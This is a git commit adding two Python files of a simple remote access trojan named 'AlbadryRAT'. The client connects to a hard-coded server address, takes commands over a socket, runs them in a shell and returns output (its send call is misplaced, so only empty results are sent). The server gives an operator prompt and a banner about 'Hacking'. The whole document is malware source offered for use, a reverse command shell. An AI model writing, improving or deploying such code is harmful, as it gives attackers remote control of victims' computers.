3f8ddf8163dc127785babe61a4d0aaef35fb414d
Mohammed <104918630+Mr7amade@users.noreply.github.com>
2026-03-05 21:32:56 +0200

    Add files via upload

---
+++ AlbadryRAT_Client.py
@@ -0,0 +1,29 @@
+import sys
+import socket
+import subprocess
+
+server_ip = "127.0.0.1"
+port = 8080
+
+s = socket.socket()
+s.connect((server_ip, port))
+msg = s.recv(1024).decode()
+print('[*] Server:' ,msg)
+
+while True:
+    cmd = s.recv(1024).decode()
+    print(f'[+] Recv Command: {cmd}')
+    if cmd.lower() in ['q', 'quit', 'exit', 'close']:
+        break
+
+    try:
+        res = subprocess.check_output(cmd , stderr=subprocess.STDOUT, shell=True)
+    
+    except Exception as e:
+        res = str(e).encode()
+    
+    if len(res) == 0:
+        res = "[+] Executed Suc".encode()
+        s.send(res)
+
+s.close()
---
+++ AlbadryRAT_Server.py
@@ -0,0 +1,38 @@
+import socket
+import sys
+print(f"                   ___________________________")
+print(f"                  |***************************|")
+print(f"                  |***Welcome to AlbadryRAT***|")
+print(f"                  |***************************|")
+print(f"                  |******Discord: mr_7amade***|")
+print(f"                  |___________________________|")
+
+server_ip = "127.0.0.1"
+port = 8080
+
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((server_ip, port))
+
+s.listen(1)
+
+while True:
+    print(f'[+] listening as {server_ip}:{port}')
+    
+    client = s.accept()
+    print(f'[+] New Client! {client[1]}')
+    client[0].send('Connected'.encode())
+    while True:
+        cmd = input(">>> ")
+        client[0].send(cmd.encode())
+        if cmd.lower() in ['quit', 'exit', 'q', 'close']:
+            break
+        res = client[0].recv(1024).decode()
+        print(res)
+    
+    client[0].close()
+    cmd = input('Wait for new client to Hacking') or 'y'
+    if cmd.lower() in ['n', 'No']:
+        break
+    
+s.close()
